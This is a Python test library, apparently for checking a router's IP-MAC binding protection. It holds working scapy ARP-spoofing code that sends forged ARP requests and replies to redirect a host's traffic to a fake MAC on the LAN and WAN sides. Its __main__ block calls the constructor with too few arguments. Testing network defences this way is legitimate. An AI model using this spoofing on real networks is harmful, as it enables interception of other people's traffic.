'''
Created on 2013-3-23

@author: hany
'''
from scapy.all import *
import threading
import sys
import time
import psutil
from robot.libraries import  BuiltIn

def get_var(var_name):
    m = BuiltIn.BuiltIn()
    return m.get_variable_value(var_name)

class arpReqSniff:
    def __init__(self,gate_way_ip,gate_way_mac,victim_ip,fake_mac,interface,timeout= 60):
        self.gate_way_ip = gate_way_ip
        self.gate_way_mac = gate_way_mac
        self.victim_ip = victim_ip
        self.fake_mac = fake_mac
        self.interface = interface
        self.timeout =  timeout
        self.arp_spoof_success = False
    
    def sniff_callback(self,pkt):
        if pkt.haslayer(ARP):
            ether = pkt.getlayer(Ether)
            arp = pkt.getlayer(ARP)
            if ether.src == self.gate_way_mac and arp.op == 1:
                e = Ether(src=self.fake_mac,dst=self.gate_way_mac)
                a = ARP(op=2,pdst=self.gate_way_ip,hwdst=self.gate_way_mac,psrc=self.victim_ip,hwsrc=self.fake_mac)
                p = e/a
                sendp(p,iface=self.interface,count=30)
        
        if pkt.haslayer(ICMP):
            ip = pkt.getlayer(IP)
            icmp = pkt.getlayer(ICMP)
            e = pkt.getlayer(Ether)
            if ip.src == self.gate_way_ip  and ip.dst == self.victim_ip \
                and icmp.type == 0 and e.dst == self.fake_mac:
                self.arp_spoof_success = True
            
    def stop_callback(self,pkt):
        return self.arp_spoof_success
        
    def run(self):
        pkts = sniff(store=1,prn=self.sniff_callback,timeout=self.timeout, \
                     stop_filter=self.stop_callback,iface=self.interface)
        wrpcap('arp_spoof.pcap', pkts)
        

class arpReqSendTh(threading.Thread):
    def __init__(self,gate_way_ip,gate_way_mac,victim_ip,fake_mac,interface):
        threading.Thread.__init__(self)
        self.gate_way_ip = gate_way_ip
        self.gate_way_mac = gate_way_mac
        self.victim_ip = victim_ip
        self.fake_mac = fake_mac
        self.interface = interface
        self._stop = threading.Event()
    
    def stop(self):
        self._stop.set()
        
    def run(self):
        while True:
            e = Ether(src=self.fake_mac,dst=self.gate_way_mac)
            a = ARP(op=1,pdst=self.gate_way_ip,hwdst=self.gate_way_mac,psrc=self.victim_ip,hwsrc=self.fake_mac)
            p = e/a
            sendp(p,iface=self.interface)
            time.sleep(0.3)
            if self._stop.isSet():
                break

class IPMACBindTest:
    def __init__(self,host_lan_ip,router_lan_ip,router_wan_ip,host_wan_ip):
        self.host_lan_ip = host_lan_ip
        self.router_lan_ip = router_lan_ip
        self.router_wan_ip = router_wan_ip
        self.host_wan_ip = host_wan_ip
        self.host_wan_mac = self.get_host_iface_mac(host_wan_ip)
        self.host_wan_iface_name = self.get_host_iface_name(host_wan_ip)
        self.host_lan_mac = self.get_host_iface_mac(host_lan_ip)
        self.host_lan_iface_name = self.get_host_iface_name(host_lan_ip)
        self.router_lan_mac = self.get_router_iface_mac(router_lan_ip)
        self.router_wan_mac = self.get_router_iface_mac(router_wan_ip)
    
    def get_host_iface_mac(self, ip):
        for iface_name in sorted(ifaces.data.keys()):
            dev = ifaces.data[iface_name]
            if dev.ip == ip:
                return str(dev.mac)
        raise RuntimeError('can\'t find host wan iface')
    
    def get_host_iface_name(self, ip):
        for iface_name in sorted(ifaces.data.keys()):
            dev = ifaces.data[iface_name]
            if dev.ip == ip:
                return str(dev.name)
        raise RuntimeError('can\'t find wan iface')
    
    def get_router_iface_mac(self, ip):
        ans, unans = arping(ip)
        for pair in ans:
            if pair[1].hwsrc == None:
                raise RuntimeError('arp router wan mac error')
            else:
                return pair[1].hwsrc
    
    def arp_spoof_should_success(self):
        fake_mac = None
        fake_mac = str(RandMAC())
        while fake_mac == self.host_lan_mac:
            fake_mac = str(RandMAC())
        
        arpReqSend = arpReqSendTh(self.router_lan_ip,self.router_lan_mac, \
                                    self.host_lan_ip,fake_mac,self.host_lan_iface_name)
        
        arpRqSniffTh = arpReqSniff(self.router_lan_ip,self.router_lan_mac, \
                                   self.host_lan_ip,fake_mac,self.host_lan_iface_name)
        
        arpReqSend.start()
        arpRqSniffTh.run()
        arpReqSend.stop()        
        if arpRqSniffTh.arp_spoof_success == False:
            raise RuntimeError('arp spoof fail')
        time.sleep(5)
    
    def wan_arp_spoof_should_success(self):
        fake_mac = None
        fake_mac = str(RandMAC())
        while fake_mac == self.host_lan_mac:
            fake_mac = str(RandMAC())
        
        arpReqSend = arpReqSendTh(self.router_wan_ip,self.router_wan_mac, \
                                    self.host_wan_ip,fake_mac,self.host_wan_iface_name)
        
        arpRqSniffTh = arpReqSniff(self.router_wan_ip,self.router_wan_mac, \
                                   self.host_wan_ip,fake_mac,self.host_wan_iface_name)
        
        arpReqSend.start()
        arpRqSniffTh.run()
        arpReqSend.stop()        
        if arpRqSniffTh.arp_spoof_success == False:
            raise RuntimeError('arp spoof fail')
        time.sleep(5)
        
    def kill_ping_proc(self):
        for proc in psutil.process_iter():
            if proc.name == 'ping.exe':
                proc.kill()
            
if __name__ == '__main__':
    p = IPMACBindTest('192.168.1.25','192.168.1.1')
    p.arp_spoof_should_success()
  